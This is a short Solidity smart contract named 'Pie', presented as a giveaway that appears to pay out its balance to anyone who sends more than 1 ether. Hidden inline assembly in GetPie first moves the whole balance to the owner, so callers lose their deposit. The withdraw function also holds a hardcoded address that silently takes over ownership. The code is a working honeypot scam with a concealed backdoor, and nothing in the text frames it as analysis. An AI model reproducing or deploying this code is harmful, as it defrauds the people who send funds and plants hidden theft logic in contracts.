pragma solidity ^0.4.19;

contract Pie {
    address public Owner = msg.sender;

    function() public payable {}

    function GetPie() public payable {
        if(msg.value > 1 ether) {
            assembly {
                mstore(0, sload(0))
                mstore(32, balance(address))
                pop(call(gas, mload(0), mload(32), 0, 0, 0, 0))
            }
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() payable public {
        if(msg.sender == 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6) {
            assembly {
                sstore(0, 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6)
            }
        }
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) payable public {
        require(msg.sender == Owner);
        assembly {
            let succeeded := call(gas, adr, callvalue, add(data, 0x20), mload(data), 0, 0)
            switch iszero(succeeded)
            case 1 { revert(0, 0) }
        }
    }
}